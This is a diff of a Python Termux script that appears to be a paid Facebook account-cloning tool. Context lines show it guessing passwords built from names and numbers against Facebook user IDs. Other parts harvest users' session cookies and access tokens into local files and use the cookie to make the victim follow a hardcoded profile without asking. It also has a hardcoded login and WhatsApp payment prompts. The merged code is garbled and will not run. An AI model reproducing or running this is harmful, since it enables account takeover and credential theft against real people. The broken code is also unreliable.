@@ -1,188 +1,225 @@
-# Decompile by Mardis (Tools By Kapten-Kaizo)
-# Time Succes decompile : 2023-03-23 12:53:33.123174
+#-----------------[ IMPORT-MODULE ]-------------------
+from bs4 import BeautifulSoup as sop
+import requests,bs4,json,os,sys,random,datetime,time,re
+import urllib3,rich,base64
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import print as rprint
+from rich import pretty
+from rich.text import Text as tekz
+import time
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+pretty.install()
+CON=sol()
+#os.system("pkg install espeak")
 
+
+
+from os import path
+import os,base64,zlib,pip,urllib
+try:
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
+        from string import *
+        from concurrent.futures import ThreadPoolExecutor as tred
+except ModuleNotFoundError:
+        os.system(f'pip install requests futures==2 > /dev/null')
+except:pass
+
+
+#---------------------------------MAIN>MENU---------------------------------#
 import os
+import os
+import sys
+import time
+import requests
+import uuid
+os.system('git pull')
+#os.system("pkg install espeak")
+
+def o():
+    os.system('clear')
+    print(logo)
+    print("\033[1;92m[\033[1;92m\033[1;34mA\033[1;92m] RANDOM NUMBER GREEN CLONING \x1b[38;5;208m[ONLY OK]")
+    CYBER =input("\033[1;92m[\033[1;34m➢]\033[1;92mCHOOSE : ")
+    if CYBER == 'A':
+    	C1()
+    if me in ["1", "01","11","A","a"]:
+	  # os.system('clear')
+        None('\n\x1b[1;31mEXIT\x1b[0;97m')
+        
+
+
+
+import os,sys,time,json,random,re,string,platform,base64,uuid
+os.system("git pull")
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
 try:
     import requests
-except ImportError:
-    print('\n Module requests !...\n')
-    os.system('pip install requests')
-
-try:
-    import concurrent.futures
-except ImportError:
-    print('\n Module futures !...\n')
-    os.system('pip install futures')
-    os.system('termux-setup-storage')
-
-try:
-    import bs4
-except ImportError:
-    print('\n Module bs4 !...\n')
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
     os.system('pip install bs4')
 
-import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid
-from concurrent.futures import ThreadPoolExecutor as BilalBSN
-from datetime import datetime
-from bs4 import BeautifulSoup
+#------------------APK<>CHECKER-------------------#    
+def cek_apk(session,coki):
+    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        #print(f'\033[1;91m%s[%s!%s] %sNot Found Active Apk%s  '%(N,M,N,M,N))
+    #else:
+        #print(f'\r[🔥] %s \x1b[1;95m Your Active Apps     :{GREEN}'%(GREEN))
+        for i in range(len(game)):
+            print(f"\033[\033[1;92m[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
+        #else:
+            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
+    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+    sop = BeautifulSoup(w,"html.parser")
+    x = sop.find("form",method="post")
+    game = [i.text for i in x.find_all("h3")]
+    if len(game)==0:
+        print(f'\033[1;96m%s[%s!%s] %sNot Found Expired Apk%s           \n'%(N,M,N,M,N))
+    else:
+        print(f'\r[🔥] %s \x1b[1;95m  Your Expired Apps     :{RED}'%(M))
+        for i in range(len(game)):
+            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
+        else:
+            print('')
+            
+            
 
+ 
+def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://www.facebook.com/profile.php?id=100083131624990', {
+            'cookie': coki }, **('cookies',)).text, 'html.parser')
+        get = r.find('a', 'Ikuti', **('string',)).get('href')
+        session.get('https://free.facebook.com' + str(get), {
+            'cookie': coki }, **('cookies',)).text
+            
+            
+ 
+class cyber:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.0000)
+            
 
-ct = datetime.now()
-n = ct.month
-bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
-try:
-    if n < 0 or n > 12:
-        exit()
-    nTemp = n - 1
-except ValueError:
-    exit()
-
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-op = bulan[nTemp]
+#-------------------COLOR----------------#
+RED = '\x1b[38;5;208m'
+WHITE = '\033[1;92m'
+GREEN = '\033[\033[1;92m' 
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
 P = '\x1b[1;97m' # PUTIH
 M = '\x1b[1;91m' # MERAH
-H = '\x1b[1;92m' # HIJAU
+H = '\x1b[38;5;46m' # HIJAU
 K = '\x1b[1;93m' # KUNING
 B = '\x1b[1;94m' # BIRU
 U = '\x1b[1;95m' # UNGU
 O = '\x1b[1;96m' # BIRU MUDA
 N = '\x1b[0m'    # WARNA MATI
+A = '\x1b[1;90m' # WARNA ABU ABU
+BN = '\x1b[1;107m' # BELAKANG PUTIH
+BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
+BP = '\x1b[1;105m' # BELAKANG PINK
+BB = '\x1b[1;104m' # BELAKANG BIRU
+BK = '\x1b[1;103m' # BELAKANG KUNING
+BH = '\x1b[1;102m' # BELAKANG HIJAU
+BM = '\x1b[1;101m' # BELAJANG MERAH
+BA = '\x1b[1;100m' # BELAKANG ABU ABU
 my_color = [
  P, M, H, K, B, U, O, N]
-warna = random.choice(my_color)
 
-data,data2={},{}
-aman,cp,salah=0,0,0
-ubahP,pwBaru=[],[]
-ok = []
-cp = []
-id = []
-user = []
-loop = 0
-url_lookup = "https://lookup-id.com/"
-url_mb = "https://m.facebook.com"
-url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
-bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
-done = False
-def animate():
-    os.system("clear")
-    for c in itertools.cycle(['\x1b[1;92m|', '\x1b[1;92m/', '\x1b[1;92m-', '\x1b[1;92m\\']):
-        if done:
-            break
-        sys.stdout.write(f'\r{N}[{O}â€¢{N}] Loading ' + c)
-        sys.stdout.flush()
-        time.sleep(0.03)
-t = threading.Thread(target=animate)
-t.start()
-time.sleep(0.5)
-done = True
+gg = random.choice(my_color)
+bi = random.choice([P,M,K,B,U,O,N,H])
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+os.system('')
+os.system('clear')
+print('\x1b[1;32m             WELCOME TO AR RAHIM NEW PAID TOOLS  \033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●')
+time.sleep(1)
+os.system('xdg-open https://t.me/rahimking2034 ')
+import getpass
 
-def jalan(z):
-    for e in z + '\n':
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.01)
+attemps = 0
 
-def logo():
-	print("""%s
-         \033[0;37m 
-           \033[1;92m░░░░░██╗██╗██╗░░██╗░█████╗░██████╗░
-           \033[1;93m░░░░░██║██║██║░░██║██╔══██╗██╔══██╗
-           \033[1;91m░░░░░██║██║███████║███████║██║░░██║
-           \033[1;92m██╗░░██║██║██╔══██║██╔══██║██║░░██║
-           \033[1;93m╚█████╔╝██║██║░░██║██║░░██║██████╔╝
-           \033[1;33m░╚════╝░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░
-             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
-             \033[1;93m▇▇➣    \033[1;91mAUTHOR   : JIHAD HASAN       \033[1;93m▇▇
-             \033[1;93m▇▇➣    \033[1;94mGITHUB   : JIHAD HASAN       \033[1;93m▇▇
-             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : JIHAD HASAN       \033[1;93m▇▇
-             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801302426149     \033[1;93m▇▇
-             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS PAID          \033[1;93m▇▇
-             \033[1;93m▇▇➣    \033[1;94mGIVE ME 500 tk FOR APRVAL     \033[1;93m▇▇
-             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
-             
+while attemps < 12345677901:
+    username = input('Enter username: ')
+    password = input('Enter password: ')
 
-"""%(O))
-
-def reg():
-    os.system('termux-setup-storage')
-    os.system('clear')
-    os.system('xdg-open https://www.facebook.com/profile.php?id=100083131624990')
-    logo()
-    print ('')
-    print ('                     Checking Approval')
-    time.sleep(1) 
-    try:
-        to = open('/sdcard/Android/.bs7nt.txt', 'r').read()
-    except (KeyError, IOError):
-        reg2()
-    r = requests.get('https://github.com/rahim2034/Rahim.Txt').text
-    if to in r:
-        time.sleep(2)
-        bsn_menu()
+    if username == 'Rahim' and password == '2034':
+        print('You have successfully logged in.')
+        break
     else:
+        print('\033[1;35mINCORRECT THIS TOOLS IS PAID PLZ CONTACT WHATSAPP; +8801831355810')
+        attemps += 1
+        continue
+os.system('clear')
+os.system(')
+#-------------------mylover-------------------#
+logo= """\033[1;92m
+
+                 _____       _     _
+     /\          |  __ \     | |   (_)
+    /  \   _ __  | |__) |__ _| |__  _ _ __ ___
+   / /\ \ | '__| |  _  // _` | '_ \| | '_ ` _ \
+  / ____ \| |    | | \ \ (_| | | | | | | | | | |
+ /_/    \_\_|    |_|  \_\__,_|_| |_|_|_| |_| |_|
+ 
+
+\033[1;91m\033[1;41m\033[1;97m              WELCOME TO AR Rahim TOOLS               \033[;0m\033[1;91m\033[1;92m
+
+\033[1;92m══════════════════════════════════════════
+\033[1;32m[-] TOOLS TYPE:\033[1;32m PREMIUM
+\033[1;32m[-] VERSION   :\033[1;32m 3.0
+\033[1;32m[-] AUTHOR    :\033[1;32m AR Rahim 
+\033[1;32m[-] ADVICE    :\033[1;32m  Free User get fucking a dog
+\033[1;32m[-] GIRLFRIEND  :\033[1;32m No Have Girlfriend 
+\033[1;92m══════════════════════════════════════════
+\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS AR Rahim BRAND\033[;0m\033[1;91m═══>\033[1;92m"""
+#os.system('espeak -a 300 " WELLCOME   TO THE   AR Rahim COMMAND"')
+
+
+
+try:
+    print("\033[\033[1;92m\nTOOL UPDATE SUCCESSFUL\n")
+    time.sleep(2)
+    o()
+    print("\033[1;91m\nYOUR DEVICE IS NOT SUPPORTED!\n")
+    o()
+    v = 5.2
+    update = ('5.2')
+    update = ('5.2')
+    if str(v) in update:
         os.system('clear')
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100083131624990')
-        logo()
-        print('')
-        print ('               \tApproved Not Detected')
-        print ('')
-        print("            \033[1;97mTHIS TOOL IS PAID YOU NEED TO GET APPROVED FIRST")
-        print ('               \033[1;97mYOUR KEY : ' + to)
-        print("               COPY AND SEND KEY TO ADMIN")
-        name = input("               YOUR NAME : ")
-        input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
-        time.sleep(3.5)
-        tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+to
-        os.system('am start https://wa.me/+880131355810?text=' + tks)
-        reg()
-
-def reg2():
-    os.system('clear')
-    logo()
-    print('')
-    print ('\tApproval Not Detected')
-    print('')
-    id = uuid.uuid4().hex[:50]
-    print("            \033[1;97mTHIS TOOL IS PAID YOU NEED TO GET APPROVED FIRST")
-    print ('               \033[1;97mYOUR KEY : ' + id)
-    print("               COPY AND SEND KEY TO ADMIN")
-    name = input("               YOUR NAME : ")
-    input('\033[1;97m               PRESS ENTER  TO SEND TOKEN')
-    time.sleep(3.5)
-    tks = 'Dear%20JIHAD-sir,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+id
-    os.system('am start https://wa.me/+8801031355810?text=' + tks)
-    sav = open('/sdcard/Android/.bs7nt.txt', 'w')
-    sav.write(id)
-    sav.close()
-    reg()
-
-
-
-def chigozie():
-    os.system('clear')
-    print (' %s*%s tools ini menggunakan login cookies facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan cookies facebook?\n %s*%s ketik open untuk mendapatkan cookies'%(O,N,O,N,O,N))
-    cookie = input("\n %s[%s?%s] Cookies : %s"% (O,O,O,O))
-    if cookie in['OPEN','Open','open']:
-      jalan("\n  %s* %sanda akan di arahkan ke YouTube"%(O,O));time.sleep(3);os.system('xdg-open https://wa.me/+8801302426149');chigozie()
-    try:
-        head={'Host':'business.facebook.com','cache-control':'max-age=0','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','accept-encoding':'gzip, deflate br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cookie': cookie}
-        asww=requests.get("https://business.facebook.com/creatorstudio/home", headers=head)
-        reqq=re.search('{"accessToken":"(EAA\w+)', asww.text)
-        tokn=reqq.group(1)
-        open('.cokie.txt', 'a').write(cookie)
-        open('.token.txt', 'a').write(tokn)
-        nama = requests.get('https://graph.facebook.com/me?access_token=%s'%(tokn)).json()['name']
-        print('\n\n %s*%s selamat datang %s%s%s'%(O,O,O,nama,O));time.sleep(2)
-        print(' %s*%s mohon untuk menggunakan sc ini sewajarnya, kami tidak bertanggung jawab jika sc ini disalah gunakan...'%(O,O));time.sleep(2)
-        input(' %s*%s tekan enter '%(O,O))
-        os.system('xdg-open https://wa.me/+8801831355810')
-        bsn_menu()
-    except AttributeError:
+    else:pass
         print('\n %s[%sÃ—%s] cookies invalid'%(O,O,O));time.sleep(1);chigozie()
     except UnboundLocalError:
         print('\n %s[%sÃ—%s] cookies invalid'%(O,O,O));time.sleep(1);chigozie()
@@ -449,7 +486,7 @@ class __bsn__:
                             pwx = [name,xz[0]+'1234',xz[0]+'1234',xz[0]+'12345',xz[0]+'786']
                         kirim.submit(self.__metode__, uid, pwx, "m.facebook.com")
                     except:
-                        pass
+       pass
 
             hasil(ok,cp)
         else:
@@ -458,4 +495,3 @@ class __bsn__:
 
 if __name__ == '__main__':
     reg()
-
